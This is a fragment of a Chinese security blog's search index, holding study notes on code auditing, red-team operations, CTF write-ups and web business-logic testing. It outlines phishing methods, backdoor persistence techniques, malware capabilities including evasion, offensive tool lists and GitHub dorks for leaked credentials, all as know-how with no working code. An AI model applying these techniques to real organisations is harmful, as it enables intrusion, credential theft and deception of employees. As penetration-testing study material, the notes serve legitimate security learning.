","date":"2021-12-03","objectID":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/:3:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（上）","uri":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/"},{"categories":["安全技术","学习"],"content":"0x03 常用指令以及对应的说明 ","date":"2021-12-03","objectID":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/:4:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（上）","uri":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/"},{"categories":["安全技术","学习"],"content":"0x04 常见的代码审计思路 敏感函数回溯参数过程 目前使用最多。优点是只需搜索相应敏感关键字，即可快速挖掘想要的漏洞。缺点是没有全覆盖代码，定位漏洞利用点花费时间长，无法挖掘逻辑漏洞。 通读全文代码 首先看程序的大体代码结构，如主目录的文件，模块目录的文件等等，还有注意文件的名称、大小、创建时间。 目录结构，需要特别注意的文件： 函数集文件，通常包含functions或者common等关键字，这些文件包含一些公共的函数，提供统一调用。寻找技巧：打开index.php或者一些功能性文件。 配置文件，通常命名中包含config等关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息。需要注意配置文件中参数值使用单引号还是双引号，如果是双引号则很可能存在代码执行漏洞。 安全过滤文件，通常命名中有filter、safe、check等关键字，主要是对参数进行过滤。 index文件，程序的入口文件，可以了解整个程序的架构、运行的流程、包含到的文件。 通读全文代码的好处是可以更好地了解程序的架构以及业务逻辑，能够挖掘到更多、更高质量的逻辑漏洞。缺点是花费的时间多，复杂程序的分析困难。 根据功能点定向审计 文件上传功能。最常见的漏洞是任意文件上传。还有SQL注入，因为一般程序员不会注意到对文件名进行过滤，但有需要把文件名存入数据库。 文件管理功能。如果程序将文件名或文件路径直接在参数中传递，则很可能存在任意文件操作漏洞。还可能存在XSS，程序会在页面输出文件名，而通常会疏忽对文件名进行过滤。 登录认证功能。目前大多认证方式是基于Cookie和Session的，可能存在任意用户登录漏洞，或者越权漏洞。 找回密码功能。如果可以重置管理员密码，就能间接控制业务权限甚至服务器权限。最常见的是验证码爆破。 ","date":"2021-12-03","objectID":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/:5:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（上）","uri":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/"},{"categories":["安全技术","学习"],"content":"\r## 0x00 攻击目标选择\r人 个人基础信息 员工通讯录 社交账号：邮箱、手机、账号 社交关系 互联网泄露信息 角色关系：客户、员工、供应商、合作方 信息资产 域名/IP 内外网拓扑结构 端口 使用软件 使用网络设备 关键系统：邮箱、OA、VPN、域控 关联合作方资产 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x01 如何寻找突破口？ ■工作人员的安全意识薄弱永远是最致命的 •弱口令、撞库、泄露账号、钓鱼、物理入侵 ■已知漏洞未必无效，内网已成重灾区 •积累漏洞利用库 ■以小见大，稳步推进，主站无洞可从旁站入手 • XSS、CSRF、SQLI、越权-＞获取管理员账号-＞上传、备份-\u003e后台getshell ■切勿急躁，发现源码-＞ 审计漏洞 •文件扫描、GitHub ■未公开0day漏洞是超级武器，考虑得失比 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x02 钓鱼攻击 ■ 口令钓鱼 导引用户到URL与界面外观与真正网站几无二致的假冒网站输入个人数据。期算使用强式加密的SSL服务器认证，要侦测网站是否仿冒实际上仍很困难。（域名仿冒、中奖邮件） ■ 鱼叉式网络钓鱼 私人化定制，伪装成目标的同事或亲友等身份，诱导目标点击链接或下载附件（word, vpn） 。或伪装成领导，要求员工进行XX操作。 ■ 偷渡式下载(Drive-by download) 授权但不了解后果的下载（例如，安装未知或伪造的可执行程序，ActiveX组件或Java applet）不知情的情况下进行的任何下载，通常是计算机病毒，间谍软件，恶意软件或犯罪软件。 ■ 热点钓鱼（WIFI钓鱼） 切断目标的网络，设置一个假的公开WIFI，目标一旦连入网络，所有数据和操作都会被掌控。 ■ 搜索引擎钓鱼 付费广告（购买近似域名、提升权重）。 ■ 桌面钓鱼 修改hosts并制作成自解压文件，捆绑其他软件，通过任意途径诱导用户安装。 ■ 社会工程学 伪造猎头身份，诱导目标员工下载word木马。根据个人信息，生成字典。 ■ DNS欺骗 破坏DNS记录，将目标网站的访客引至事先布好的欺诈网站（入侵路由器）。 ■ 水坑攻击 得知目标经常访问的网站后，攻击该网站，放置登录控件马。 ■ 物理攻击 水、电、网、空调维修人员冒充；假冒面试者，提供U盘进行打印。 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x03 后门隐藏 ■ webshell的隐藏 • 回调后门、代码混淆和加密、不死马、无文件webshell ■ 计划任务、启动项、注册表 ■ 增加UID为0/权限为Administrator的账户 ■ ssh key ■ alias后门——.bashrc /etc/profile alias命令进行重写操作 ■ suid后门——https://zhuanlan.zhihu.com/p/97685460、http://wyb0.com/posts/2016/linux-suid-back-door/ ■ ssh：软链接后门、ssh server wrapper ■ pam后门 ■ mafix后门 ■ Kbeast_rootkit后门 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x04 内网渗透-选择攻击目标 ■ 优先攻击高权限账号，如管理员，目标系统负责人账号； ■ 优先攻击运维/安全人员账号和终端，这些人往往有服务器root账号，安全设备管理员账号，可以进一步深入控制； ■ 优先攻击集中管控设施，如域控，集中身份认证系统，终端管理系统，攻陷单系统即获得公司内大部分系统的权限； ■ 优先攻击基础设施，如DNS, DHCP,邮件系统，知识分享平台，oa系统，工单系统；这些系统有内置高权限账号，或可以帮助攻击者隐蔽痕迹。或Git/SVN等开发源代码管理服务器，通过代码审计发现应用0day漏洞。 定制化恶意软件 远控功能 敏感信息收集功能 漏洞利用能力 蠕虫特性 目标业务实现 免杀与流量加密 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x05 信息收集工具 ■ 公司信息收集：天眼查、爱企查、GitHub、各大搜索引擎 ■ 个人信息收集：Telegram、 QQ、微信、钉钉、支付宝、脉脉、Linkedin、贴吧 ■ 端口扫描工具：NMap、ZMap、masscan、GGscan ■ 目录扫描工具：dirb、dirsearch、御剑、SourceLeakHacker、wwwscan、 weakfilescan ■ whois /备案查询：站长之家、阿里云、VirusTotal、SecurityTrails、备案查询 ■ 历史域名解析记录：ViewDNSInfo、DomailTools、dnsdumpster、WhoISRequest ■ C段收集工具：必应 ■ 子域名收集工具：Layer子域名挖掘机、subDomainsBrute、OneForAll、Sublist3r、DNSDumper、IP反查域名、 谷歌语法:site:baidu.com ■ 指纹识别：云悉、Finger-P、TiderFinger、whatweb ■ 多地ping工具(CDN )：站长之家、爱站网、just-ping ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x06 绕过CDN查找真实IP 探测是否开启CDN （多地ping工具） 方法一：杳找二级域名（一般二级域名不会放CDN ） 方法二：nslookup法（大部分CDN只针对国内市场），nslookup http://xxx.cn 国外dns 方法三：ping法，ping http://xxx.com （有些CDN厂商基本只把 www.xxx.com cname到cdn主服务器上去www.xxx.co和http://xxx.com是两条独立的解析记录，一般只会把www.xxx.com 做 CDN ） 方法四：杳找历史域名解析记录（使用CDN前是真实IP ） 方法五：内部邮箱源（必须是目标自己的mailserver） 方法六：网站测试文件，phpinfo等 方法七：APP （抓包） ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x07 EXP、POC库，漏洞扫描框架 ■ exploit-db、乌云镜像库、vulhub ■ CMS-Hunter、onlinetools、Some-PoC-oR-ExP、exphub ■ struts-scan、wpscan、kunpeng、AWVS、appscan、nessus、xray ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x08 漏洞利用工具 ■SQLMap、BrupSuite、NoSQLMap ■webshell : webshell、webshell-sample、WebShell、php-webshells ■webshell管理工具：菜刀（部分版本存在后门）、蚁剑（部分版本存在RCE漏洞 : 1、2）、冰蝎 ■内网渗透神器：Metasploit-Framework、Cobalt Strike （可克隆网站、制作word宏病毒、发送邮件） ■ Proxy：ReGeorg、Earthworm、Termite、ProxyChains-ng、Proxifier、Venom、openvpn ■ 提权：windows-kernel-exploits、linux-kernel-exploits、LinEnum ■ 端口转发：Windows、 Linux ■ 手机短信接收平台：xx云短信、z-sms、receive-sms-online ■ 在线临时匿名邮箱：yopmail ■ 在线邮件伪造：EMKEI、小幻邮箱系统 ■ 在线短链生成：站长之家、短网址工具 ■ 在线md5解密：cmd5、zuwuwang、somd5、pmd5、chamd5、xmd5、ttmd5 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:8:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x09 数据安全：企业敏感信息泄露 常见泄露源 网盘微盘（百度网盘） 代码托管平台（github） 文库平台 微博、论坛等社交网站 防范措施 禁止在互联网上发布公司内部信息 常见泄露内容 企业组织架构 员工通讯录 供应商或合作方 源码文件 账号密码 技术方案 招投标文件 项目合同 网络拓扑 内部系统手册 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:9:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x0A 弱口令 什么是弱口令？ 字符种类（数字、大小写、符号）不够、长度不够 系统/设备默认（出厂）口令 使用和个人或公司有关信息，例如生日、年份、公司名称：19800304、CHAITIN 包含键盘上的连续按键：qwert、lqaz@wsz、! @# 包含特殊含义字符串：520 、1314 、iloveyou 其他常用字符串：root、abcl23 ! 、@123 使用一台双核PC+暴力破解软件进行本地破解需花费的时间 口令强度 6位长 8位长 纯粹由数字构成 \u003c1s 10s 小写或大写字母组成 30s 348mins 大小写字母混合组成 33mins 62days 数字+ 大小写字母组成 90mins 253days 数字+ 大小写+符号组成 22hours 23years ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:10:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x0B 常见端口和服务以及攻击手法（部分） ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:11:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x0C 设备部署 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:12:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x0D 社 https://www.iculture.cc/sg/pig=1034 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:13:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["安全技术","学习"],"content":"0x0E 加固 安全加固的三个方面：用户 文件 登录 etc/login.defs定义了/etc/passwd和/etc/shadow配套的用户限制，必须存在，没有时，某些时候并不会影响使用，但有些时候会产生意想不到的情况。 如果/etc/passwd和/etc/shadow与/etc/login.defs产生冲突，会以优先级更高的/etc/passwd和/etc/shadow为主。 使用命令grep -Ev \"^#|^$\" /etc/login.defs，查看文件内容 MAIL_DIR /var/mail PASS_MAX_DAYS 99999 #密码最大有效期 以天为单位 一般365天\rPASS_MIN_DAYS 0 #两次修改密码最小间隔 以天为单位 PASS_MIN_LEN 5 #密码最小长度 5 对root无效\rPASS_WARN_AGE 7 #密码过期前n天开始提示\rUID_MIN 1000 #创建普通用户的时 如果不指定UID 就会从1000递增 centos6从500开始\rUID_MAX 60000 #创建普通用户的最大ID 65534\rSYS_UID_MIN 201 #不指定UID时 创建系统的最小UID\rSYS_UID_MAX 999 #不指定UID时 创建系统的最大UID\rGID_MIN 1000\rGID_MAX 60000\rSYS_GID_MIN 201 SYS_GID_MAX 999\rCREATE_HOME yes #创建用户时 创建相应的家目录\rUMASK 077 #用户的家目录的权限值 700\rUSERGROUPS_ENAB yes #删除用户时 如果用户组内没有其他用户时 是否删除用户组 ENCRYPT_METHOD SHA512 #用户密码使用SHA512加密\r修改后（通用型） PASS_MAX_DAYS 90 PASS_MIN_LEN 12 /etc/passwd的内容 root : x : 0 : 0 : root : /root : /bin/bash\rbin : x : 1 : 1 : bin : /bin : /sbin/nologin\r用户名 : 用户密码 : 用户的UID : 用户的GID : 用户的注释 : 用户的主目录 : 用户的shell\r由于/etc/passwd允许所有用户读取，容易导致用户的密码泄露，所以linux系统将用户相关的密码信息分离到/etc/shadow，只用root用户有读的权限。 ","date":"2021-11-30","objectID":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:14:0","tags":["渗透测试"],"title":"私密：个人学习笔记","uri":"/2021-11-30-hvv%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["WriteUp"],"content":"0x00 Vigenere 二战的鹰酱截获了敌军发送的密报，但是关于如何破解却无从下手。经过密码学专家分析，这是“不可破译的密码”。但那已经是上个世纪的事了，现在，我相信你肯定有办法。 题目明示维基利亚加密，文本如下： cvnwvk lqae bw wzgy czxrxlm gnaoiiaafy. am ara xaufwiu qf fwg mlfckmnv tru aajtwxr pmsd afw rfe zms ehvv bzmn lpiebq yeeuiia. zq hsl qrvq keskw fn jqswtvtp wjpwkmvvuq afw lzoz feuarzksx lwoic qf unxhvdiluof litcjutq. amj usun jxwvijoh vbvvkluofl mekdgdw iiemldalbse bwetagk, imnqrkx ieoazewkmeo, tunskc jmugramc, tzqbtgzvrxzk afw wf wf. fhw miru zms ohr kpw fhakh gzale ag xym kqcggh eiluoftp zvvgslkmrt Aztwkrvb kqcmkmkg lqczgscwyk scbpca uamhxxzbaan, lai zvxaretxzwf eeunvzbq fratxytgz tjtmeqfs csft, rvv fhw litwfp pjbdv qf fhw \"zyrv'sz cmi\" qrvsseexrk whqrsmmfv szd etmebwzafvi twebelbxzwf af alk emliojd wvkmdilr wbqdxs uhqgmlutahr.tlmeeu pickgye qhy, kicq ygnv wtss:53d613xv-6g5t-4lv6-n3cw-8ug867t6n648 这里使用以前编写的小工具进行差分分析，能够推测出密钥 可以看到文本信息也是能理解的内容，但因为原来的程序没有考虑特殊字符，如-和空格，分析的内容存在一些小误差，但用密钥在线解密就能够得到flag了。 ","date":"2021-11-29","objectID":"/2021-11-29-%E8%8F%9C%E7%8B%97%E3%81%AE%E6%98%A5%E7%A7%8B%E6%9D%AFwriteup/:1:0","tags":["CTF"],"title":"菜狗の春秋杯WriteUp","uri":"/2021-11-29-%E8%8F%9C%E7%8B%97%E3%81%AE%E6%98%A5%E7%A7%8B%E6%9D%AFwriteup/"},{"categories":["WriteUp"],"content":"0x01 helloshark 张三深知misc的魅力所在，于是他向大佬给他出了一道题，是一张图片。你能帮张三找出图片中的秘密吗？ 解压，得到hint，压缩包密码在图片中。 LSB隐写查看到密码@91902AF23C#276C2FC7EAC615739CC7C0 解压分析流量，追踪tcp流发现端倪。 手动拼凑得到flag{a40a418-fced-4b2d-9d76-fdc9053d69a1} ","date":"2021-11-29","objectID":"/2021-11-29-%E8%8F%9C%E7%8B%97%E3%81%AE%E6%98%A5%E7%A7%8B%E6%9D%AFwriteup/:2:0","tags":["CTF"],"title":"菜狗の春秋杯WriteUp","uri":"/2021-11-29-%E8%8F%9C%E7%8B%97%E3%81%AE%E6%98%A5%E7%A7%8B%E6%9D%AFwriteup/"},{"categories":["WriteUp"],"content":"0x02 secret-chart NO one know chart better than me! 解压得到压缩包，爆破得到密码9527 打开表格，发现只有1和空白的数据，是24X24格式的。 把所有数据拼凑在一起，新建格式规则，填充。 用中国编码扫描得到zfua{B3s1o9in1Nw0halUnofuNc0HM1} 凯撒加密枚举得到flag ","date":"2021-11-29","objectID":"/2021-11-29-%E8%8F%9C%E7%8B%97%E3%81%AE%E6%98%A5%E7%A7%8B%E6%9D%AFwriteup/:3:0","tags":["CTF"],"title":"菜狗の春秋杯WriteUp","uri":"/2021-11-29-%E8%8F%9C%E7%8B%97%E3%81%AE%E6%98%A5%E7%A7%8B%E6%9D%AFwriteup/"},{"categories":["安全技术","学习"],"content":"0x00 账号安全案例总结 账号密码直接暴露在互联网上 搜索语法 邮件配置信息查询 site:Github.com smtp password;\r数据库信息泄露 site:Github.com sa password;\rsvn信息泄露 site:Github.com svn;\r数据库备份文件 site:Github.com inurl:sql\r开源项目存在可解密信息，如base64加密的cookie。 无限制登录任意账号 攻击者可以利用漏洞绕过登录限制，或者利用已经认证的用户，通过修改身份ID登录任意账号。 电子邮件账号泄露事件 公开文件中包含邮件账号密码的敏感信息。 中间人攻击 SSL证书欺骗攻击，通过DNS劫持和局域网ARP欺骗甚至网关劫持等技术，将用户的访问重定向到攻击者的设备上，让用户机器与攻击者机器建立HTTPS连接（使用伪造的CA证书），而攻击者机器再跟Web服务端连接。 SSL劫持，是指将页面中的HTTPS超链接全部替换成HTTP版本，让用户始终以明文的形式进行通信。 撞库攻击 撞库是黑客公告收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登录其他网站后，得到一系列可以登录的用户名和密码组合。 ","date":"2021-11-28","objectID":"/2021-11-28-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%AE%9E%E8%B7%B5%E7%AF%87/:1:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（实践篇）","uri":"/2021-11-28-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%AE%9E%E8%B7%B5%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x01 密码找回安全案例总结 密码找回凭证可被暴力破解 密码找回凭证直接返回客户端 有些信息系统在密码找回功能的设计上存在漏洞，可能会将用于用户自证明身份的信息的密码找回凭证以各种各样的方式返回到客户端。 密码重置链接存在弱Token 有些信息系统的密码找回功能会在服务端生成一个随机Token并发送到用户邮箱作为密码找回凭证。但一旦这个Token的生成方式被破解，攻击者就可以伪造该Token作为凭证重置其他用户密码。 密码重置凭证与用户账号关联不严 有些信息系统在密码找回功能的校验逻辑上存在缺陷，只校验了密码重置凭证是否在数据库中存在，但未严格校验该重置凭证和用户账号之间的绑定关系。 重新绑定用户手机或邮箱 有些信息系统在绑定用户手机或者邮箱的功能上存在越权访问漏洞。攻击者可以利用该漏洞越权绑定其他用户的手机或者邮箱后，再通过正常的密码找回途径重置他人的密码。 服务端验证逻辑缺陷 有些信息系统的服务端验证逻辑上存在漏洞，攻击者可以通过删除数据包中的某些参数、修改邮件发送地址或者跳过选择找回方式和身份验证的步骤，直接进入重置密码页面成功重置其他人的密码。 修改返回包绕过验证 有些信息系统在密码找回功能的设计上存在缺陷，攻击者只要抓取服务端的返回包并修改其中的部分参数即可跳过验证步骤，直接进入密码重置页面。 注册覆盖 Session覆盖 ","date":"2021-11-28","objectID":"/2021-11-28-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%AE%9E%E8%B7%B5%E7%AF%87/:2:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（实践篇）","uri":"/2021-11-28-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%AE%9E%E8%B7%B5%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x02 越权访问安全案例 ","date":"2021-11-28","objectID":"/2021-11-28-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%AE%9E%E8%B7%B5%E7%AF%87/:3:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（实践篇）","uri":"/2021-11-28-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%AE%9E%E8%B7%B5%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x00 前言 阅读《Web攻防之业务安全实战指南》一书所做的学习笔记。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:1:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x01 登录认证模块测试 暴力破解测试 burp利用字典穷举 本地加密传输测试 测试客户端与服务器交互数据在网络传输过程中是否采用SSL，加密数据能否被破解。 使用Wireshark抓包，在捕获流中找到对应的请求数据包，分析内容。 Session会话固定测试 攻击者可利用客户端上未清空的Session标识，并诱骗用户利用攻击者生成的固定会话进行系统登录，从而导致用户会话认证被窃取。 在注销退出系统时，使用burp截取请求数据，对当前浏览器授权SessionID值进行记录，再次登录时进行比对校验，判断是否使用相同的SessionID值进行授权认证，若是，则存固定会话风险。 Session会话注销测试 攻击者能利用用户注销或退出时留存的Session认证会话属性标识，将从持续有效的认证会话中盗取用户权限。 用burp对已登录授权的页面进行请求数据的截取，保存数据包中的Session认证参数值，发送至Repeater模块，退出页面后，再次发送授权访问请求并查看系统是否对退出的用户授权Session解出授权。 Session会话超时时间测试 对系统会话授权认证时长来进行测试，并根据系统承载的业务需求来分析判断当前Session的生命周期是否过长。 用burp对已登录授权的页面进行请求数据的截取，保存数据包中的Session认证参数值，发送至Repeater模块，在此后的固定时间内（比如30min）不再使用该授权会话与服务器进行交互访问，然后在Repeater模块发送授权访问请求并查看系统返回结果是否存在授权后可查阅的特殊信息。 Cookie仿冒测试 攻击者通过尝试修改Cookie中的身份标识，从而达到仿冒其他用户身份的目的，并拥有相关用户的所有权限。 使用普通账户登录系统，burp抓包修改Cookie的认证标识值（比如 userid改为“admin”），查看提交后的信息，判断身份授权是否被修改。 密文比对认证测试 有些网站系统的流程是在前台浏览器的客户端对密码进行Hash加密后传输到服务器并与数据库加密值进行比较，如果加密值相同，则判定用户提交密码正确。该流程会泄露密码加密方式，导致出现安全隐患。 以使用MD5加密算法为例，burp抓包查看加密后的密文，通过对页面代码的分析得出Web系统登录口令加密处理的过程是由本地JS脚本完成的，方式为MD5，添加burp配置项“Payload Processing”，点击“ADD”，选择“Hash“和“MD5”，将所有明文密码进行数据处理转换后暴力破解登录测试并成功破解。 登录失败信息测试 系统会在页面显示用户登录失败的信息，如提交的账号不存在，系统提示“用户名不存在”，提交的账号存在，系统提示“口令错误”等间接提示消息，攻击者可以据此判断用户账号信息，进行针对性的暴力破解。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:2:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x01 业务办理模块测试 订单篡改测试 当开发者没有考虑登录后用户权限隔离的问题时，就好导致平行权限绕过漏洞。 攻击者注册一个普通账户，然后篡改、遍历订单ID，获得其他用户订单中的敏感隐私信息。 手机号码篡改测试 在登录后的某些功能点，开发者很容易忽略登录用户的权限问题。 攻击者登录后，通过抓包等方式发现请求中有手机号参数时，可以尝试修改测试是否存在越权漏洞。 用户ID篡改测试 攻击者通过篡改用户ID越权访问其他用户隐私信息。 邮箱和用户篡改测试 在发送邮件或站内消息时，篡改其中发件人参数，导致攻击者可以伪造发信人进行钓鱼攻击等操作。 商品编号篡改 攻击者提交订单时，抓包篡改商品编号，导致价格不对应但却交易成功。 竞争条件测试 攻击者通常利用多线程并发请求，在数据库中的余额字段更新之前，多次兑换积分或购买商品，从中获利。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:3:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x02 业务授权访问模块 非授权访问测试 非授权访问是指在每一通过验证授权的情况下，能够直接访问需要通过认证才能访问到的页面或文本信息。 将登录后的相关页面链接复制到其他浏览器火其他电脑上进行访问，观察能否访问成功。 水平越权测试 正常更改或查看A账户信息，抓包或更改账户身份ID，成功查看同权限其他账户业务信息。 垂直越权测试 登录普通账户A，抓包或直接更改账户A的身份为高权限的账户C，查看高权限的用户信息。 ","date":"2021-11-24","objectID":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/:4:0","tags":["渗透测试","Web安全"],"title":"业务安全学习笔记（技术篇）","uri":"/2021-11-25-%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%8A%80%E6%9C%AF%E7%AF%87/"},{"categories":["安全技术","学习"],"content":"0x03 输入/输出模块测试 